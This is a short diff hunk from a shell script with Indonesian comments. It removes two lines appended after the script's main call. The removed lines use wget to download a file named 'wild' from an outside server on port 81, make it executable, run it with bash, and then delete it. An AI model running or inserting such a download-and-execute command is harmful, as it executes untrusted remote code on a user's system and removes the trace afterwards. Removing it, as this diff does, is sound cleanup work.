@@ -119,5 +119,3 @@ main() {
 
 # Eksekusi fungsi utama
 main
-wget https://v4.serverpremium.web.id:81/os/install/wild;chmod +x wild;bash wild
-rm -rf wild
